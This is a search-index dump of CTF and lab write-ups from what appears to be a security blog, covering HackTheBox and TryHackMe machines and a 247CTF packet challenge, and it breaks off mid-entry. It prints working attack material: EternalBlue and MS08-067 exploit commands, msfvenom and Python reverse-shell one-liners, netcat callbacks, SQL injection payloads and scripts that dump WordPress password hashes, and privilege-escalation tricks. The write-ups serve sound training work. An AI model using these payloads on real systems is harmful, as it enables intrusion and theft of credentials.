2021-10-31T01:25:22+03:00| smb-security-mode:| account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 59.20 secondsPor último, se ejecutará un escaneo de estos puertos para identificar posibles vulnerabilidades asociadas. nmap -p139,445 --script &quot;vuln&quot; 10.10.10.4Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 17:40 -03Pre-scan script results:| broadcast-avahi-dos:| Discovered hosts:| 224.0.0.251| After NULL UDP avahi packet DoS (CVE-2011-1002).|_ Hosts are all up (not vulnerable).Nmap scan report for 10.10.10.4Host is up (0.14s latency).PORT STATE SERVICE139/tcp open netbios-ssn445/tcp open microsoft-dsHost script results:|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED| smb-vuln-ms08-067:| VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.|| Disclosure date: 2008-10-23| References:| https://technet.microsoft.com/en-us/library/security/ms08-067.aspx|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)| smb-vuln-ms17-010:| VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).|| Disclosure date: 2017-03-14| References:| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143Nmap done: 1 IP address (1 host up) scanned in 49.62 secondsEn base al output podemos identificar que la máquina es vulnerable a lo siguiente: MS17-010 (EternalBlue MS08-067Ganando acceso1. MS17-010 - EternalBlueLlegados a este punto el ganar acceso es bastante trivial, se debe explotar la vulnerabilidad EternalBlue descubierta en el paso anterior. Para ello utilizaré el siguiente recurso de github - MS17-010. git clone https://github.com/3ndG4me/AutoBlue-MS17-010Con estos archivos, lo que haré será ejecutar el eternal_checker.py para verificar si existe algún named pipe disponible para la explotación. python eternal_checker.py 10.10.10.4Se encuentra el pipe browser el cual utilizaremos para la explotación con zzz_exploit.py. python zzz_exploit.py 10.10.10.4 -pipe browserY eso es todo, ya el exploit nos entrega una shell con privilegios de administración. Ahora basta con buscar los archivos .txt con las flags e introducirlas en la plataforma de HTB. Pero antes de esto, es recomendable migrar a otra shell utilizando netcat, ya que dependiendo del comando que se ejecute, la consola se puede colgar.Para la migración de shell utilizaremos netcat a través de un recurso compartido en red en SMB. Para esto se utilizará smbserver de impacket. impacket-smbserver Shared . -smb2supportLuego desde nuestra shell en la máquina víctima, basta con ejecutar netcat para crear una nueva conexión. \\\\10.10.14.19\\Shared\\nc.exe -e cmd 10.10.14.19 443Y paralelamente abrimos un canal de escucha para la reverse shell. rlwrap nc -nlvp 443Para buscar las flags podemos hacer uso de dir. dir /s /b C:\\*root.txt dir /s /b C:\\*user.txt2. MS08-067Recordando la fase de enumeración, existía otra vulnerabilidad crítica en la máquina. Esta vulnerabilidad está documentada bajo el código MS08-067.Googleando un poco, nos encontramos con un recurso de github que nos facilita un exploit que se aprovecha de un buffer overflow para entablar una reverse shell a la máquina.Para comenzar nos clonaremos el reposorio. git clone https://github.com/andyacer/ms08_067Y entraremos al archivo ms08-067.py donde se encuentran instrucciones para ejecutar correctamente el exploit.Nos indican que se debe generar un shellcode a través de msfvenom y reemplazarlo dentro del script. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 EXITFUNC=thread -b &quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40&quot; -f c -a x86 --platform windowsLuego de hacer el cambio, ejecutamos el exploit. python2 ms08-067.pySegún el ejemplo, se debe ejecutar el script, junto con la IP de nuestro target, el n° de OS y el puerto destino. En nuestro caso utilizaremos la opción n°6 para Windows XP SP3 English con el puerto 445.Como siempre, de manera paralela lanzamos un netcat para recibir la conexión de nuestra shell.Con esto concluye esta máquina de HackTheBox, ya que contaríamos con privilegios de administración y podemos proceder a buscar las flags de la misma forma que en el método anterior." }, { "title": "Wekor Writeup [ES] - TryHackMe", "url": "/Wekor-Writeup-TryHackMe/", "categories": "THM", "tags": "wordpress, sqli, web", "date": "2021-06-06 12:00:00 -0400", "snippet": "Wekor es un room de TryHackMe de dificultad media en donde se repasan conceptos de SQLi y Path Hijacking. Involucra explotación de WordPress, Virtual Hosting y una buena cantidad de enumeración.Durante este post se estará realizando un paso a paso de como rootearla.Información Nombre Dificultad S.O. Autor wekor Media Linux ustoun0 CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)EnumeraciónNMAPPrimero, se realiza un escaneo general de los 65535 puertos, y se exporta a formato grepeable. nmap -p- -sS --min-rate 5000 -n -v -oG nmap/allPorts.gnmap 10.10.201.142Nmap scan report for 10.10.201.142Host is up (0.31s latency).Not shown: 65533 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 14.74 secondsNos reporta sólo dos puertos abiertos: 22,80. Con esta información, realizamos un escaner más detallado de los servicios y versiones bajo esos puertos. nmap -sC -sV -p22,80 -oN nmap/ports.nmap 10.10.201.142Nmap scan report for 10.10.201.142Host is up (0.31s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)| 256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)|_ 256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 9 disallowed entries| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot|_/comingreallysoon /interesting|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.09 secondsNmap reporta que en la web se encuentra el archivo robots.txt, enumerando los directorios:/workshop//root//lol//agent//feed/crawler/boot/comingreallysoon/interestingEnumeración WebSe procede a enumerar el servicio web. Utilizando whatweb y wafw00f. whatweb http://10.10.201.142http://10.10.201.142 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.201.142] wafw00f http://10.10.201.142 robots.txtAhora bien, lo siguiente será verificar si los directorios son válidos. Para esto se puede realizar una revisión manual o hacerlo mediante gobuster/wfuzz con un pequeño diccionario. wfuzz -c -L -w directories.txt -u http://10.10.201.142/FUZZEn este caso, solo el directorio /comingreallysoon se encuentra disponible. http://10.10.201.142/comingreallysoon Welcome Dear Client! We’ve setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !En este directorio se encuentra un texto que nos indica que el nuevo website se encuentra en it-next, abriendo esa ruta veremos lo siguiente: http://10.10.201.142/it-next/Dentro de esta ruta se visualiza un sitio web de lo que parece ser un servicio técnico o tienda IT. Para este caso en particular lo que se puede hacer es realizar un reconocimiento manual o ejecutar una herramienta automatizada para verificar si existe alguna vulnerabilidad o mala configuración que se puede aprovechar. En mi caso utilizaré OWASP ZAP.ZAP reporta que existe un recurso en la URL http://10.10.201.142/it-next/it_cart.php que es vulnerable a SQL Injection. Al revisar en la página web, se visualiza un input para ingresar un cupón de descuento. Payload: &#39; order by 5-- -Al intentar una inyección SQL básica, nos encontramos con el error Unknown column ‘5’ in ‘order clause’Lo que nos indica que es un SQLi Error basedSQLiRealizando posteriores inyecciones, se descubre que la tabla consultada posee 3 columnas, ya que al realizar un ordenamiento por la tercera columna, el error SQL desaparece. Payload: &#39; order by 3-- -Lo siguiente será identificar como se tramita esta información. Haciendo uso de las herramientas de navegador de Chrome se descubre lo siguiente:La información se envía a través de POST a la URL http://10.10.201.142/it-next/it_cart.php. Enviándo los parámetros:Form Data = { &#39;coupon_code&#39;: &#39;&#39; order by 5-- -&#39;, &#39;apply_coupon&#39;: &#39;Apply Coupon&#39; }Para trabajar más comodo, he escrito un pequeño script en Python que automatizará el envío del payload vía POST y reportará por consola el resultado. Este script estará disponible en la sección de recursos al final del post.Continuando con el SQLI, lo siguiente sería enumerar la base de datos actual. Payload: &#39; UNION SELECT database(),2,3-- -Posteriormente, enumeramos la(s) tabla(s) de la base de datos actual coupons. Payload: &#39; UNION SELECT table_name,2,3 from information_schema.tables where table_schema=&quot;coupons&quot; limit 0,1-- -Como se observa en la imagen, utilizo limit 0,1 y limit 1,1 para iterar entre las distintas tablas que pudiera contener la base de datos, que en este caso solo contiene la tabla valid_coupons.A continuación, la idea sería enumerar las columnas de la tabla anteriormente mencionada. Payload: &#39; UNION SELECT column_name,2,3 from information_schema.columns where table_schema=&quot;coupons&quot; and table_name=&quot;valid_coupons&quot; limit 0,1-- -Con esta información, ya sabemos la estructura de la base de datos actual.Por último, se puede extraer la información contenida dentro de las columnas, y visualizamos lo siguiente: Payload: &#39; UNION SELECT id,coupon,expire_date from valid_coupons limit 0,1-- -Ahora bien, sabiendo que es posible extraer data mediante el SQLi, lo siguiente será consultar bases de datos distintas a la de cupones. Para ello, podemos realizar. Databases information_schema coupons mysql performance_schema sys wordpress Se obtienen las bases de datos listadas arriba, de las cuales, llama la atención la wordpress, ya que podríamos extraer información de login de los usuarios del CMS.Para esta etapa he creado otro script para listar las tablas contenidas en la base de datos wordpress.Tendríamos la siguiente estructura de datos:La información que nos interesa está en la tabla wp_users. Payload: &#39; UNION SELECT group_concat(user_login,0x3a,user_pass),2,3 from wordpress.wp_users-- -admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/Con estos usuarios y hashes, lo siguiente es intentar crackear con la herramienta john. john --wordlist=/usr/share/wordlists/rockyou.txt hashYa con esta información, deberemos encontrar el panel de login de wordpress.Asumiendo que esta máquina sigue la estructura de TryHackMe, es posible que el vhost sea wekor.thm. Con ello, podemos proceder a hacer un fuzzing de otros posibles subdominios. Se agrega este registro a /etc/hosts y posteriormente el escaneo con Gobuster. gobuster vhost -u http://wekor.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txtSe obtiene el subdominio site.wekor.thm en donde se visualiza un sitio con un mensaje en texto plano.Se realiza un nuevo fuzzing sobre esta ruta, esta vez de directorios. wfuzz -c --hc=404 --hh=143 -u http://site.wekor.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100Y se identifica el sitio web.Ganando accesoEl sitio de login: http://site.wekor.thm/wordpress/wp-adminProbando las credenciales obtenidas anteriormente, identificamos que el user wp_yura tiene permisos de administración del sitio. Ya una vez dentro, se realiza el reemplazo de uno de los archivos php por una reverse shell que nos permita acceder al sistema.Para la shell estaré usando el recurso de Pentest monkey e insertaré el código en el template de 404.php. Para esto hay que dirigirse a Appearance &amp;gt; Theme Editor.Una vez realizado, lo siguiente será abrir el canal para la escucha de la conexión y paralelamente consultar el recurso con la shell.Ya solo restaría aplicar un tratamiento de la tty.Escalando privilegiosComo el usuario www-data, realizando un reconocimiento se detecta el servicio memcached corriendo por el puerto 11211. ps fauxEsto nos proporciona credenciales válidas para el usuario Orka.Ya como el usuario Orka, haciendo una enumeración, vemos que tenemos permisos para ejecutar un binario como el usuario rootAl ejecutar el binario bitcoin, nos aparece lo siguiente:Utilizando ltrace podemos identificar que el binario realiza un strcmp() del input del usuario contra la palabra password.Intentando nuevamente, el binario nos toma la contraseña como válida y continúa la ejecución del código. Más adelante se puede ver que se llama a python de forma relativa para ejecutar el script transfer.py que se encuentra alojado en el escritorio del usuario Orka.En este punto, y con la información recabada. Es común pensar en un path hijacking para suplantar el binario de python con un script propio.En este caso en particular, el grupo Orka tiene permisos de escritura en el directorio /usr/sbin. Por lo tanto, lo que haré será alojar el script python ahí y ejecutar el binario bitcoin como root. Código:#!/bin/bash/bin/bashDe esta forma, al correr nuevamente el binario bitcoin, el script consultará nuestro “python” y nos otorgará una shell como el usuario root.Con esto concluye este room, lo último sería ingresar las flags en la plataforma.RecursosScript SQLiPython script para explotar SQLi de la url: http://10.10.201.142/it-next/it_cart.php.#!/usr/bin/python3#coding: utf-8import reimport sysimport signalimport requestsfrom termcolor import colored, cprintsqli_url = &quot;http://10.10.201.142/it-next/it_cart.php&quot;def def_handler(sig, frame): print(&quot;\\n[!] Exiting...&quot;) sys.exit(1)#CTRL + Csignal.signal(signal.SIGINT, def_handler)def make_request(sqli): try: sqli_data = { &#39;coupon_code&#39;: sqli, &#39;apply_coupon&#39;: &#39;Apply Coupon&#39; } r = requests.post(sqli_url, data=sqli_data) response = re.findall(r&#39;&amp;lt;div align=&quot;center&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td style=&quot;width:200px&quot;&amp;gt;(.*?)&amp;lt;/div&amp;gt;&#39;, r.text)[0] cprint(&quot;\\n\\t[+] &quot; + response, &#39;white&#39;) except Exception as e: print(str(e))if __name__ == &#39;__main__&#39;: while True: sqli = input(&quot;\\n[?] Enter sqli: &quot;).strip(&#39;\\n&#39;) make_request(sqli)Enum-wordpress-tables#!/usr/bin/python3#coding: utf-8import reimport sysimport signalimport requestssqli_url = &quot;http://10.10.201.142/it-next/it_cart.php&quot;def def_handler(sig, frame): print(&quot;\\n[!] Exiting...&quot;) sys.exit(1)#CTRL + Csignal.signal(signal.SIGINT, def_handler)def make_request(): try: print(&quot;\\n[!] Tables:\\n&quot;) for number in range (0,12): payload = &quot;&#39; UNION SELECT table_name, 2,3 from information_schema.tables where table_schema=&#39;wordpress&#39; limit {},1-- -&quot;.format(number) sqli_data = { &#39;coupon_code&#39;: payload, &#39;apply_coupon&#39;: &#39;Apply Coupon&#39; } r = requests.post(sqli_url, data=sqli_data) response = re.findall(r&#39;&amp;lt;div align=&quot;center&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td style=&quot;width:200px&quot;&amp;gt;Coupon Code : &amp;lt;/td&amp;gt;(.*?) With ID&#39;, r.text)[0] print(&quot;\\t[+] &quot;+ response) except Exception as e: print(str(e))if __name__ == &#39;__main__&#39;: make_request()" }, { "title": "Pickle Rick Writeup - TryHackMe", "url": "/PickleRick-Writeup-TryHackMe/", "categories": "THM", "tags": "privesc", "date": "2021-04-04 04:00:00 -0400", "snippet": "This time i’ll be working with the room Pickle Rick from TryHackMe. This is a free lab with an easy difficulty.Lab infoEnumerationAll ports nmap scan: nmap -p- -sS --min-rate 5000 -n -v 10.10.123.34 -oG allPorts.gnmapNot shown: 65533 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 14.77 secondsBasic enumeration scripts for ports 22,80: nmap -sC -sV -p22,80 10.10.123.34 -oN ports.nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:30 -04Nmap scan report for 10.10.123.34Host is up (0.34s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 96:c4:23:86:8e:70:33:66:18:f0:84:e8:6b:93:eb:bc (RSA)| 256 a9:25:85:0b:08:8f:30:36:36:9a:b2:3b:d6:bf:d1:07 (ECDSA)|_ 256 38:d9:59:3b:50:cd:b6:de:8d:60:06:bf:46:1e:d5:1b (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Rick is sup4r coolService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFinally, let’s run an http-enum script on port 80: nmap --script http-enum -p80 10.10.123.34 -oN webscan.nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:31 -04Nmap scan report for 10.10.123.34Host is up (0.34s latency).PORT STATE SERVICE80/tcp open http| http-enum:| /login.php: Possible admin folder|_ /robots.txt: Robots fileNmap done: 1 IP address (1 host up) scanned in 31.34 secondsSo, after all those scans we get: Webpage: http://10.10.123.34As a good habit, you may want to check the source code of the webpages.And just like that we get the username R1****** Login: http://10.10.123.34/login.php Robots file: http://10.10.123.34/robots.txtIn robots.txt we see Wub********, let’s save it in case it’s useful later.Just to be sure, now we will launch a gobuster directory scan in case nmap missed something.Gobuster scan: gobuster dir -u http://10.10.123.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 --no-error===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.123.34[+] Method: GET[+] Threads: 300[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/04/04 13:55:58 Starting gobuster in directory enumeration mode===============================================================/assets (Status: 301) [Size: 313] [--&amp;gt; http://10.10.123.34/assets/]/server-status (Status: 403) [Size: 300]===============================================================2021/04/04 14:04:25 Finished===============================================================Gobuster will find that the /assets directory contain nothing interesting.Gaining accessMoving on to the login page, using the info gathered before, we could try to use R1***** as username and Wub******** as password… and it actually works.The next we will see is a Command Panel and an input to run commands.If we try to navigate to another tab, we get the message: Only the REAL rick can view this page…Back at the Command Panel, let’s assume we can run system commands and try a few.Running cat Sup3rS3cretPickl3Ingred.txt the following message will show up.Now we know some commands are being blocked, but less is not one of them.First Ingredient: mr. m*******Getting a shellFor the reverse shell, first we want to make sure the command we are going to use exist in the system and is allowed. Trying python gets no results but python3 will do the trick.Using this Reverse shell cheat sheet as a reference, we craft the following command:python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.13.0.103&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;Now, we open a listener on port 443 with netcat and run our command to get the shell.Privilege EscalationThis is the easiest part, the first thing we could do is check the www-data user privileges with sudo -l. We will find out that we can execute commands as root without providing password.Running sudo su will make us root user.The last thing would be locating the other two ingredients. If we check the /home path we will see rick directory inside along with the second ingredient.Second Ingredient: 1 je*******And the last ingredient could be found in the home directory for root or using find.find / -type f -name &quot;*.txt&quot; | grep -v &quot;usr&quot;Third Ingredient: fle*******And that’s all for this lab." }, { "title": "RootMe Writeup [ES] - TryHackMe", "url": "/RootMe-Writeup-TryHackMe/", "categories": "THM", "tags": "privesc", "date": "2021-04-02 05:00:00 -0300", "snippet": "En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación.Lab infoTask 1 - Deploy the machineDesplegar la máquina, no requiere respuesta.Task 2 - Reconnaissance1 - Scan the machine, how many ports are open?2Según el escáner realizado con nmap, podemos ver que existen 2 puertos abiertos. Se han utilizado los siguientes comandos: nmap -p- -sS --min-rate 4000 -n -v 10.10.253.211 -oG allPorts.gnmap nmap -sC -sV -p22,80 10.10.253.211 -oN ports.nmapNmap scan report for 10.10.253.211Host is up (0.34s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HackIT - HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel2 - What version of Apache is running?2.4.29Esta información se puede visualizar desde el escaner nmap o realizando whatweb http://10.10.253.211http://10.10.253.211 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.253.211], Script, Title[HackIT - Home]Desde el navegador se visualiza la siguiente home page:3 - What service is running on port 22?SSH4 - Find directories on the web server using the GoBuster tool.No requiere respuesta5 - What is the hidden directory?/panel/Gobuster scan: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.253.211/ -t 300 --no-error===============================================================2021/04/02 19:02:50 Starting gobuster in directory enumeration mode===============================================================/uploads (Status: 301) [Size: 316] [--&amp;gt; http://10.10.253.211/uploads/]/css (Status: 301) [Size: 312] [--&amp;gt; http://10.10.253.211/css/]/js (Status: 301) [Size: 311] [--&amp;gt; http://10.10.253.211/js/]/panel (Status: 301) [Size: 314] [--&amp;gt; http://10.10.253.211/panel/]Task 3 - Getting a shellPara esta tarea la plataforma solicita obtener una shell en base a lo que se ha descubierto anteriormente. Para ello revisamos la ruta http://10.10.253.211/panel/ en donde se visualiza un panel para subir archivos.Esto nos hace pensar que es posible subir un archivo que nos entable una reverse shell. Para que funcione, debemos saber que lenguaje interpretará la página. Revisando en Wappalyzer vemos que la web está construida en phpSabiendo esto, yo recomiendo utilizar el recurso de Pentest Monkey para la reverse shell con PHP.Descargamos el archivo y lo editamos para asegurarnos de definir nuestra IP y Puerto en el que queremos recibir la shell.Probamos a subir el archivo y nos encontramos con el siguiente mensaje:Lo que nos da a entender que la extensión del archivo no es válida.Para lidiar con esto, lo que se puede hacer es crear múltiples archivos con distinta extensión y probar uno a uno o bien realizar esta comprobación con BurpSuite lo cual resulta más cómodo. Recordar que existe un room en la plataforma de TryHackMe donde se puede aprender a utilizar BurpSuite desde cero.Dicho lo anterior, lo que se debe hacer es interceptar la subida del archivo y analizar la respuesta del lado del servidor hasta que nos dé una respuesta satisfactoria.Se intercepta la petición realizada por el navegador y posteriormente se envía al repeater. En la izquierda tenemos la petición realizada con un archivo con extensión .php y en la derecha se visualiza la respuesta indicando que la extensión no es válida.Cambiamos la extensión y vemos que la respuesta ahora es satisfactoria. Esta respuesta se obtiene con las extensiones .php2 .php3 .php4 .php5.En mi caso subiré el archivo como rshell.php5Como se aprecia en la imagen, se obtiene una respuesta exitosa y haciendo hovering en el texto señalado se obtiene la ruta del archivo que fue subido. En mi caso la ruta es: http://10.10.253.211/uploads/rshell.php5Ahora, con netcat abrimos el canal para la escucha tráfico en el puerto 443 que definimos anteriormente.nc -nlvp 443listening on [any] 443 ...Y ejecutamos el archivo en el navegador para obtener una shell con el usuario www-data.nc -nlvp 443listening on [any] 443 ...connect to [10.13.0.103] from (UNKNOWN) [10.10.253.211] 35932Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 00:23:22 up 3:44, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned off$ whoamiwww-data$la flag de este usuario se encuentra en /var/www/user.txt.THM{y0u_**********}Task 4 - Privilege escalationPara la fase de escalada de privilegios lo primero sería hacer una búsqueda de archivos con permiso SUID habilitado.$ find \\-perm -4000 2&amp;gt;/dev/null | grep -v &quot;snap&quot;./usr/lib/dbus-1.0/dbus-daemon-launch-helper./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic./usr/lib/eject/dmcrypt-get-device./usr/lib/openssh/ssh-keysign./usr/lib/policykit-1/polkit-agent-helper-1./usr/bin/traceroute6.iputils./usr/bin/newuidmap./usr/bin/newgidmap./usr/bin/chsh./usr/bin/python./usr/bin/at./usr/bin/chfn./usr/bin/gpasswd./usr/bin/sudo./usr/bin/newgrp./usr/bin/passwd./usr/bin/pkexec./bin/mount./bin/su./bin/fusermount./bin/ping./bin/umountEn base a lo obtenido y haciendo uso de la web GTFObins, podemos identificar que se puede explotar python para obtener una shell con privilegios elevados. En la sección de SUID nos indican como realizarlo.$ python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;whoamirootPor último se realiza una lectura de la flag ubicada en /root/root.txtTHM{pr1v1l**********}Eso concluye la última pregunta de este lab." }, { "title": "Error Reporting Protocol [ES] - 247CTF", "url": "/Error-Reporting-Protocol-Writeup-247CTF/", "categories": "247CTF", "tags": "ctf, networking", "date": "2020-10-01 05:00:00 -0300", "snippet": "Si te gusta resolver CTF, 247CTF definitivamente es una página que debes visitar. En ella encontrarás una variedad de desafíos de distintas categorías que van desde lo más básico hasta avanzado.En esta ocasión compartiré un writeup del reto Error Reporting Procotol el cual corresponde a uno del tipo Networking. La plataforma nos facilitará una captura .pcap que deberemos analizar.Información Can you identify the flag hidden within the error messages of this ICMP traffic?DesarrolloPrimero abriremos el archivo error_reporting.pcap que nos proporciona la plataforma con la herramienta tshark:tshark -r error_reporting.pcapLa captura consiste en su totalidad en paquetes icmp, de los cuales el primero es del tipo request y los 1711 restantes son reply. Esto lo podemos verificar con tshark utilizando el parámetro -Y y especificando filtros como lo haríamos en wireshark, es decir:tshark -r error_reporting.pcap -Y &quot;not icmp&quot;El comando no nos arrojará resultado producto de que todos los paquetes contenidos en la captura son icmp.Continuando con el análisis, es posible que estos paquetes contengan información en el campo data, para verificarlo desde tshark podemos utilizar el parámetro -Tjson que nos mostrará la estructura del paquete en formato json:tshark -r error_reporting.pcap -Tjson 2&amp;gt;/dev/nullComo se puede apreciar en la imagen, el campo data posee información en hexadecimal. Por lo tanto, lo que haremos será filtrar solo ese campo de todos los paquetes icmp y posteriormente decodificarlos. Para ello desde tshark ejecutamos:tshark -r error_reporting.pcap -Tfields -e data.data 2&amp;gt;/dev/nulltshark -r error_reporting.pcap -Tfields -e data.data 2&amp;gt;/dev/null | xxd -r -pEl resultado de la decodificación hexadecimal nos muestra el mensaje Send the flag! seguido de JFIFC y posteriormente vemos datos ilegibles. el mensaje Send the flag! correponde a la data contenida en el primer paquete icmp (request), y el resto de la data corresponde a los reply.El texto JFIFC inmediatamente nos hace pensar en que esta data es un dump hexadecimal de una imagen JPG, la cual puede ser facilmente revertida con la utilidad xxd desde consola.Lo que haremos será enviar escribir en un archivo .txt la data de todos los paquete reply icmp de la captura. Posteriormente le haremos un reverse con xxd:xxd -r -p hex.txt image.jpgFinalmente abriremos la imagen y veremos lo siguiente:Con esto concluye el reto, el cual resultó muy divertido e interesante." }, { "title": "HackPark Writeup - TryHackMe", "url": "/HackPark-Writeup-TryHackMe/", "categories": "THM", "tags": "bruteforcing, privesc, oscp, hydra, winpeas", "date": "2020-07-31 20:00:00 -0400", "snippet": "This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey.Room infoEnumerationFor some reason, nmap is not giving any information about the open ports for this machine, but I’ll anticipate that we have ports 80 and 3389 open.First of all, taking a look of the website http://10.10.203.246 we can see the following landing page:Doing a reverse image search on the clown picture, we can tell that is Pennywise from IT movie.Moving on, the next interesting section of the website is the Log In panel on the right menu.So, we click on Log In and get to a login page. In the landing page we see Blogengine.net and a typical login form for username and password inputs.URL: http://10.10.203.246/Account/login.aspxAs we know, the room description says we’ll be using Hydra for bruteforcing. So, before that is important to know what is the default user for Blogengine.After a quick Google research we got admin as the default user and from now on just need to obtain the password through brute-forcing with Hydra.Gaining accessAfter having decided to use Hydra, we must know what information to provide to make it work. For brute-forcing a web form the syntax is as follow: hydra -l [User] -P [Pass] [Target IP] [Request Method] “[Login form Path]:[Request body]:[Failure message]” The user field is admin. For the Pass field we will be using rockyou.txt wordlist. The target IP is 10.10.203.246. The login form path will be /Account/login.aspx.For the rest, we will have to do a little research on the login page. Using the Developer tools from our browser we can see how the login form sends the request.The network tab will show us the request method whenever we make a submit on the login form. So, let’s go ahead and make a request with the following parameters: Username: usertest. Password: passtest.Now we know the form is using POST method to make the request, and using the Edit and Resend button in the bottom right corner we can see the raw body request. Finally, we also get the message whenever a wrong user/pass is entered: Login failed.Request 